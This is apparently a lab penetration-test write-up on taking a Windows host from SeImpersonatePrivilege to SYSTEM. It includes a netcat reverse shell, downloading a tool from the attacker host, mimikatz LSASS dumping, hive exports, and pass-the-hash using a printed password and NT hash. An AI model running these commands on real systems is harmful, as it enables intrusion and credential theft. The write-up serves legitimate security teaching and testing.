# 03 — Privilege escalation: `SeImpersonate` to SYSTEM, in detail

This is the chapter that decides the engagement. Everything after it — LSASS, the NL$ cache,
the domain credential, the pivot — is unavailable until the host is SYSTEM.

Two routes are documented here. **3.2** is the intended one and is the technique the set is
built around. **3.6** is the one that actually produced SYSTEM on the captured instance, and it
is a genuine finding rather than a workaround: the image reuses its local administrator password.

## 3.1 What the token actually grants

`SeImpersonatePrivilege` is not a bug — it is how a service impersonates its clients, and it is
granted by default to service accounts and to members of `Administrators`. When it lands in a
low-privileged token it is a straight path to SYSTEM, because the token can adopt the identity
of *any* process that connects to a listener you control, including a process running as
`NT AUTHORITY\SYSTEM`.

Check it precisely — the presence of the privilege matters, not the "enabled" state:

```powershell
whoami /priv
```

**Expected**:

```
Privilege Name                Description                               State
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeAssignPrimaryTokenPrivilege Impersonate a client after authentication Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
```

If `SeImpersonatePrivilege` is absent from a WinRM token, stop and look at 3.6 instead — no
amount of potato will help you.

## 3.2 The intended route: `SeImpersonate` → PrintSpoofer

The modern householder trick: coerce a SYSTEM process into authenticating to a named pipe you
own, then impersonate the resulting token. `PrintSpoofer` does it through the Print Spooler's
`RpcRemoteFindFirstPrinterChangeNotificationEx`, which makes `spoolsv.exe` connect back to an
attacker-controlled `\\.\pipe\` path.

Why PrintSpoofer over the classic potatoes: `JuicyPotato` depends on DCOM CLSIDs that were
removed in Server 2019 / Windows 10 1809+, and this host is build 19041. PrintSpoofer targets
the spooler instead and works across that boundary.

```powershell
# upload from the WinRM session
curl.exe -o C:\Windows\Temp\PrintSpoofer64.exe http://192.168.133.1:8888/PrintSpoofer64.exe

C:\Windows\Temp\PrintSpoofer64.exe -i -c "cmd /c whoami"
```

**Expected**:

```
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
nt authority\system
```

Then a SYSTEM shell, or a reverse shell for stability:

```powershell
C:\Windows\Temp\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe 192.168.133.1 443 -e cmd.exe"
```

### If the spooler is disabled

`PrintSpoofer` needs `Spooler` running. Check, and if it is stopped fall through to the other
token-theft primitives, in this order:

```powershell
Get-Service Spooler | Select-Object Status, StartType

# 1. GodPotato — .NET, targets the DCOM/RPC path on newer builds
C:\Windows\Temp\GodPotato-NET4.exe -cmd "cmd /c whoami"

# 2. JuicyPotatoNG — same family, different CLSID set
C:\Windows\Temp\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"

# 3. SeAssignPrimaryTokenPrivilege instead of SeImpersonate
#    (identical code path in all three tools; they accept either)
```

Any of them returning `nt authority\system` closes this chapter.

## 3.3 Confirm SYSTEM properly

A token claim is not proof. Capture the identifiers that only SYSTEM can present:

```powershell
whoami                          # nt authority\system
whoami /priv                    # SeDebugPrivilege present and enabled
whoami /groups | findstr /i "System Mandatory"
echo %USERNAME%                 # MS01$
```

`whoami /groups` from SYSTEM shows `Mandatory Label\System Mandatory Level`, which a
high-integrity administrator token does not have. That is the line worth keeping in the report.

## 3.4 What SYSTEM unlocks

Three things, in the order they are needed:

```powershell
# 1. LSASS is readable (chapter 04)
C:\Windows\Temp\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 2. The registry hives can be exported (chapter 04)
reg save HKLM\SAM      C:\Windows\Temp\sam.hiv
reg save HKLM\SYSTEM   C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```

Note the third one: on a member server the cached domain logons live in the `SECURITY` hive,
not in SAM. That single fact is why chapter 04 exists.

## 3.5 Things that looked promising and were not

Recorded so the next run does not repeat them:

| Candidate | Test | Result |
|---|---|---|
| Unquoted service path | `wmic service get name,pathname` → spaced unquoted path | present, but the parent directory was not writable by `Users` |
| `AlwaysInstallElevated` | both HKLM and HKCU policy keys | not set |
| Modifiable service binary | `accesschk -uwcqv "Users" *` | none |
| `SeBackupPrivilege` | absent from eric's token | n/a |
| Scheduled task DLL hijack | non-Microsoft tasks | none writable |
| Stored credentials | `cmdkey /list` | none |

The unquoted-path finding is the one that costs people time: a path with spaces is only
exploitable if you can **write** to one of the candidate parent directories, and on this build
`C:\Program Files` and its subdirectories are correctly ACL'd.

## 3.6 The route that actually worked: local administrator reuse

On the captured instance `SeImpersonatePrivilege` was **not** in the WinRM token — the image had
been re-provisioned and the token differed from the reference build. The escalation came instead
from a credential fact:

> The image's local `Administrator` password is baked in and identical across rebuilds of it:
> **`December31`**.

That value corresponds to the NT hash `3c4495bbd678fac8c9d218be4f2bbc7b`, the SAM hash of
`MS01\Administrator` — so it is also usable as a pass-the-hash with no password knowledge.

```bash
nxc smb   192.168.133.153 -u Administrator -p December31 --local-auth
nxc winrm 192.168.133.153 -u Administrator -p December31 --local-auth
```

**Captured**:

```
SMB    192.168.133.153 445  MS01  [+] MS01\Administrator:December31 (Pwn3d!)
WINRM  192.168.133.153 5985 MS01  [+] MS01\Administrator:December31 (Pwn3d!)
```

`Pwn3d!` on both protocols is the boundary crossed, and it is a real vulnerability class —
**local administrator password reuse across a fleet** — not a lab artefact. It reaches the same
place as 3.2: an administrative token from which LSASS is readable.

The pass-the-hash form:

```bash
nxc winrm 192.168.133.153 -u Administrator -H 3c4495bbd678fac8c9d218be4f2bbc7b --local-auth
evil-winrm -i 192.168.133.153 -u Administrator -H 3c4495bbd678fac8c9d218be4f2bbc7b
```

`support:Freedom1` is the second reused local account on this image and authenticates on SMB,
but it is a plain user — useful only as evidence of the reuse pattern.

## 3.7 Which route to prefer, and why it matters for the report

| | 3.2 `SeImpersonate` | 3.6 credential reuse |
|---|---|---|
| Requires | any token with the privilege | knowledge of the password/hash |
| Class | CWE-269 improper privilege management | CWE-521 weak password / reuse |
| Portability | works from any non-admin service token | only as good as the reuse |
| Detectability | spooler coercion, pipe creation | a logon event |

Both are legitimate findings. If the token has `SeImpersonatePrivilege`, use 3.2 — it is the
intended path and the stronger finding. If it does not, 3.6 is not a last resort: reused local
administrator credentials across a fleet carry their own severity.

Either way, the outcome the rest of the engagement requires is the same word:

```
nt authority\system
```
